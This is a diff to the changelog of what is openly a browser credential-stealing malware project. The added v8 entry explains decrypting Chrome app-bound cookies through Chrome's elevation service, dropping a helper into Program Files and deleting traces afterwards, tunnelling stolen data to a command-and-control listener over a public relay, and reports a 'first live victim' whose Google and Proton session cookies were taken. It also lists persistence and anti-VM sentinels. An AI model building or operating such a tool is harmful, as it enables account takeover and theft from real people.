@@ -3,7 +3,62 @@
 
 ## What's New
 
-### v7 -- sentinel patch that actually lands, clang-cl fallback, a relay that admits it is dead (current)
+### v8 -- Chrome v20 app-bound pipeline, parser fix, first live victim (current)
+
+**Chrome 127+ app-bound cookies now come out through Chrome's own elevation
+service.** The v20 key cannot be unwrapped in-process: `os_crypt.app_bound_encrypted_key`
+is an APPB blob that only `IElevator2Chrome::DecryptData` can open. `ckdec.exe`
+(`src/ckdec.cpp`) is the COM client; it takes the raw APPB payload (base64 field
+minus the 4-byte `APPB` prefix) and returns the 32-byte key. The service checks
+the caller path, so the client must run from
+`C:\Program Files\Google\Chrome\Application` -- a copy under the user profile is
+rejected with `0x8004A007`. `CoSetProxyBlanket(..., PKT_PRIVACY, IMPERSONATE,
+..., EOAC_DYNAMIC_CLOAKING)` is mandatory or the user DPAPI layer fails with
+`0x8004A003`. `cookielog.py` stage 1 (SYSTEM) deploys the helper and writes
+`<browser>.appb`; stage 2 (user) runs it and writes `mc-<browser>.key` plus the
+legacy `mc.key`. The payload reads those files in `LoadLocalState`.
+
+**The v20 parser never reached the key file.** `LoadLocalState` looped over
+`encrypted_key` and `app_bound_encrypted_key` with the same DPAPI parser. The
+app-bound blob is thousands of base64 chars, hit the 512-byte guard and
+`continue`d before the `w == 1` branch could open `mc-<browser>.key`, so
+`g_has20` stayed false and every v20 cookie fell through as `DecCookie: no v20
+key`. The app-bound field now only signals that the build uses v20; the key file
+is read directly. v10/v11 DPAPI parsing is untouched. Local run: 95 Chrome v20
+cookies and 122 passwords decrypted, 1.25 MB POST.
+
+**One-shot key stage for clean victims: `bin\ckkey.exe`.** The payload cannot
+write the helper into Program Files by itself. `keytool.cpp` embeds `ckdec.exe`
+as RCDATA, finds Chrome's Application directory (Program Files then x86), drops
+the client there, extracts the current user's APPB blob, runs the helper as the
+same elevated user, and writes `mc-chrome.key`/`mc.key`. It deletes the helper,
+APPB and raw key afterwards; `/quiet` suppresses the message boxes. Verified
+elevated on this box: extracted key matches `chrome.key` byte-for-byte.
+
+**Remote victim over CGNAT.** The LAN C2 cannot reach a machine outside the
+network: the router WAN address falls inside `100.64.0.0/10` (CGNAT), so the
+public address never forwards. A `bore` TCP tunnel (`bore.pub:39710` ->
+`127.0.0.1:9415`) carried the payload POST. Inbound firewall 9415 and a UPnP
+mapping were added for the LAN path, but neither bypasses CGNAT. The payload's
+plain Winsock `gethostbyname` resolves the public DNS name, so no code change was
+needed.
+
+**First live victim.** 1,099 entries arrived: 960 unique cookies (916 Firefox,
+44 Vivaldi), 1 password, 4 session cookies, including 14 Google auth cookies and
+2 Proton session cookies. Zero Chrome cookies -- that machine runs Firefox and
+Vivaldi, so Chrome 156/157 v20 is still unproven on hardware; the parser fix and
+the key stage are proven locally. The listener's `/health` is deduped by
+`(domain, name, path)`, so a repeat POST can leave the count unchanged even when
+it was processed.
+
+**Housekeeping.** `build_keytool.bat` builds the stage; `bin/keytool.res` and
+`listen.err` are ignored. Local loot was moved to `loot/local_backup/` before the
+victim run. Current loader sentinels: C2 `103968`, persist `104224`, anti-VM
+`104232`; DLL C2 `37616`, anti-VM `37377`.
+
+Commits: `c8f62fc`, `d450540`, `ab94db9`.
+
+### v7 -- sentinel patch that actually lands, clang-cl fallback, a relay that admits it is dead
 
 **The C2 patch was writing to the wrong copy of the sentinel.** `loader.cpp`
 declares each sentinel twice: the writable global (`g_c2_url[256]`) and a local
